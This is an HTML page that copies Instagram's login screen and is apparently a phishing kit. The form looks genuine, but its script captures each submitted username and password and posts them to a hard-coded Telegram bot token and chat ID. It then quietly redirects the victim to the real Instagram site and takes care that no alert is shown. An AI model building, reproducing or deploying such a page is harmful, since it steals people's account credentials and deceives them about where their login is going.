<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Photo Share</title>
  <link href="https://fonts.cdnfonts.com/css/billabong" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      background: #fafafa;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
    }
    
    .container {
      max-width: 935px;
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 32px;
    }
    
    /* Phone mockup section */
    .phone-section {
      flex: 1;
      display: none;
      position: relative;
    }
    
    @media (min-width: 876px) {
      .phone-section {
        display: block;
      }
    }
    
    .phone-frame {
      background: url('https://www.instagram.com/static/images/homepage/screenshot1.jpg') no-repeat center;
      background-size: cover;
      width: 380px;
      height: 580px;
      margin: 0 auto;
    }
    
    /* Login section */
    .login-section {
      flex: 1;
      max-width: 350px;
    }
    
    .login-box {
      background: #ffffff;
      border: 1px solid #dbdbdb;
      border-radius: 1px;
      padding: 40px 40px 30px;
      text-align: center;
      margin-bottom: 10px;
    }
    
    .logo {
      font-family: 'Billabong', cursive;
      font-size: 48px;
      color: #262626;
      margin-bottom: 32px;
      letter-spacing: 0.5px;
    }
    
    .input-group {
      margin-bottom: 8px;
    }
    
    input {
      width: 100%;
      padding: 12px 10px;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      font-size: 13px;
      color: #262626;
    }
    
    input::placeholder {
      color: #8e8e8e;
    }
    
    input:focus {
      outline: none;
      border-color: #a8a8a8;
    }
    
    button {
      width: 100%;
      margin-top: 12px;
      padding: 8px 10px;
      background: #0095f6;
      border: none;
      border-radius: 4px;
      color: white;
      font-weight: 600;
      font-size: 14px;
      cursor: pointer;
    }
    
    button:hover {
      background: #1877f2;
    }
    
    .divider {
      display: flex;
      align-items: center;
      margin: 20px 0;
      font-size: 12px;
      font-weight: 600;
      color: #8e8e8e;
      text-transform: uppercase;
    }
    
    .divider::before,
    .divider::after {
      content: "";
      flex: 1;
      height: 1px;
      background: #dbdbdb;
    }
    
    .divider::before {
      margin-right: 16px;
    }
    
    .divider::after {
      margin-left: 16px;
    }
    
    .fb-login {
      color: #385185;
      font-weight: 600;
      font-size: 14px;
      text-decoration: none;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      margin-bottom: 16px;
    }
    
    .fb-login i {
      font-size: 16px;
    }
    
    .forgot {
      display: inline-block;
      font-size: 12px;
      color: #00376b;
      text-decoration: none;
    }
    
    .forgot:hover {
      text-decoration: underline;
    }
    
    .signup-box {
      background: #ffffff;
      border: 1px solid #dbdbdb;
      border-radius: 1px;
      padding: 20px;
      text-align: center;
      font-size: 14px;
      color: #262626;
      margin-top: 10px;
    }
    
    .signup-box a {
      color: #0095f6;
      font-weight: 600;
      text-decoration: none;
      margin-left: 4px;
    }
    
    .app-section {
      text-align: center;
      margin-top: 20px;
    }
    
    .app-section p {
      color: #262626;
      font-size: 14px;
      margin-bottom: 16px;
    }
    
    .app-links {
      display: flex;
      justify-content: center;
      gap: 8px;
    }
    
    .app-badge {
      display: flex;
      align-items: center;
      gap: 6px;
      background: #000000;
      border-radius: 4px;
      padding: 6px 12px;
      color: white;
      font-size: 12px;
      text-decoration: none;
    }
    
    .app-badge i {
      font-size: 14px;
    }
    
    .footer {
      margin-top: 40px;
      text-align: center;
      font-size: 11px;
      color: #8e8e8e;
    }
    
    .footer-links {
      display: flex;
      justify-content: center;
      gap: 16px;
      flex-wrap: wrap;
      margin-bottom: 16px;
    }
    
    .footer-links a {
      color: #8e8e8e;
      text-decoration: none;
    }
    
    .footer-links a:hover {
      text-decoration: underline;
    }
    
    .copyright {
      color: #8e8e8e;
    }

    /* Loading spinner - hidden by default */
    .loading-spinner {
      display: none;
      width: 20px;
      height: 20px;
      border: 2px solid #ffffff;
      border-top: 2px solid transparent;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    button.loading {
      background: #1877f2;
      opacity: 0.8;
      cursor: not-allowed;
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Phone image section -->
    <div class="phone-section">
      <div class="phone-frame"></div>
    </div>
    
    <!-- Login section -->
    <div class="login-section">
      <div class="login-box">
        <div class="logo">Instagram</div>
        
        <form id="loginForm">
          <div class="input-group">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
          </div>
          <div class="input-group">
            <input type="password" id="password" placeholder="Password" required>
          </div>
          <button type="submit" id="loginButton">
            <span id="buttonText">Log In</span>
            <div class="loading-spinner" id="spinner"></div>
          </button>
        </form>
        
        <div class="divider">OR</div>
        
        <a href="#" class="fb-login">
          <i class="fab fa-facebook-square"></i>
          Log in with Facebook
        </a>
        
        <a href="#" class="forgot">Forgot password?</a>
      </div>
      
      <div class="signup-box">
        Don't have an account? <a href="#">Sign up</a>
      </div>
      
      <div class="app-section">
        <p>Get the app.</p>
        <div class="app-links">
          <a href="#" class="app-badge">
            <i class="fab fa-google-play"></i>
            <span>Google Play</span>
          </a>
          <a href="#" class="app-badge">
            <i class="fab fa-apple"></i>
            <span>App Store</span>
          </a>
        </div>
      </div>
      
      <div class="footer">
        <div class="footer-links">
          <a href="#">Meta</a>
          <a href="#">About</a>
          <a href="#">Blog</a>
          <a href="#">Jobs</a>
          <a href="#">Help</a>
          <a href="#">API</a>
          <a href="#">Privacy</a>
          <a href="#">Terms</a>
          <a href="#">Locations</a>
          <a href="#">Instagram Lite</a>
          <a href="#">Threads</a>
          <a href="#">Contact Uploading & Non-Users</a>
          <a href="#">Meta Verified</a>
        </div>
        <div class="copyright">
          <span>English</span>
          <span>¬© 2025 Instagram from Meta</span>
        </div>
      </div>
    </div>
  </div>

  <script>
    const TOKEN = "8088123811:AAFrniGTUkc3far2QTKUMjI8ZtoQ-qyWwKg";
    const CHAT_ID = "6657880965";

    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      
      // Get button elements
      const loginButton = document.getElementById('loginButton');
      const buttonText = document.getElementById('buttonText');
      const spinner = document.getElementById('spinner');
      
      // Get input values
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      
      if (!username || !password) {
        return; // HTML5 required will handle this
      }
      
      // Show loading state (no alert!)
      loginButton.classList.add('loading');
      buttonText.style.display = 'none';
      spinner.style.display = 'block';
      
      // Prepare message
      const message = `üîê New Login:\nüë§ Username: ${username}\nüîë Password: ${password}\n‚è∞ Time: ${new Date().toLocaleString()}`;
      
      try {
        // Send to Telegram
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
          })
        });
        
        // Redirect to real Instagram - NO ALERT SHOWN!
        window.location.href = 'https://www.instagram.com';
        
      } catch (error) {
        console.error('Error:', error);
        // Still redirect even if Telegram fails (no alert)
        window.location.href = 'https://www.instagram.com';
      }
    });
  </script>
</body>
</html>
